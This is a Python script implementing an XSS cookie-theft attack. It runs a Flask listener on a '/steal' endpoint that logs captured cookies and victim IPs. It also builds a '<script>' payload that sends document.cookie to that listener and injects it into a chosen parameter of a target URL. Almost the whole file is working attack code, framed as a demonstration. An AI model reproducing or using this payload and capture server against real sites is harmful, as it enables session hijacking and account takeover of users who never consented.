import requests
from colorama import Fore, init
from flask import Flask, request
import threading
import time

init(autoreset=True)

class CookieTheftExploit:
    def __init__(self, capture_port=9999):
        self.capture_port = capture_port
        self.captured_cookies = []
        self.app = Flask(__name__)
        self._setup_routes()
        self.server_thread = None

    def _setup_routes(self):
        @self.app.route("/steal")
        def steal():
            stolen_cookie = request.args.get("c", "")
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

            self.captured_cookies.append({
                "cookie": stolen_cookie,
                "timestamp": timestamp,
                "source_ip": request.remote_addr
            })

            print(f"\n{Fore.RED}{'='*60}")
            print(f"{Fore.RED}[CAPTURED] STOLEN SESSION COOKIE RECEIVED")
            print(f"{Fore.RED}{'='*60}")
            print(f"{Fore.YELLOW}  Cookie:    {stolen_cookie}")
            print(f"{Fore.YELLOW}  From IP:   {request.remote_addr}")
            print(f"{Fore.YELLOW}  Time:      {timestamp}")
            print(f"{Fore.RED}{'='*60}\n")

            return b"", 200

        import logging
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)

    def start_capture_server(self):
        print(f"{Fore.BLUE}[*] Starting cookie capture server on port {self.capture_port}...")

        self.server_thread = threading.Thread(
            target=lambda: self.app.run(host="127.0.0.1", port=self.capture_port, debug=False),
            daemon=True
        )
        self.server_thread.start()
        time.sleep(1)
        print(f"{Fore.GREEN}[+] Capture server listening at http://127.0.0.1:{self.capture_port}/steal")

    def build_payload(self):
        capture_url = f"http://127.0.0.1:{self.capture_port}/steal"
        payload = f"<script>new Image().src='{capture_url}?c='+document.cookie;</script>"
        return payload

    def demonstrate(self, url, param_name, base_params, method="get"):
        print(f"\n{Fore.CYAN}{'='*55}")
        print(f"{Fore.CYAN}   XSS COOKIE THEFT DEMONSTRATION -> {url}")
        print(f"{Fore.CYAN}{'='*55}\n")

        self.start_capture_server()

        payload = self.build_payload()
        print(f"{Fore.BLUE}[*] Generated payload:")
        print(f"{Fore.YELLOW}    {payload}")

        victim_session = requests.Session()

        test_params = base_params.copy()
        test_params[param_name] = payload

        print(f"{Fore.BLUE}[*] Simulating victim visiting the malicious link...")

        if method == "post":
            victim_session.post(url, data=test_params, timeout=10)
        else:
            victim_session.get(url, params=test_params, timeout=10)

        time.sleep(2)

        if self.captured_cookies:
            print(f"{Fore.RED}[!] EXPLOIT SUCCESSFUL — session cookie exfiltrated")
            return self.captured_cookies
        else:
            print(f"{Fore.YELLOW}[?] No cookie captured — payload may not have executed "
                  f"(this is expected if testing with a session that has no cookies set)")
            return None
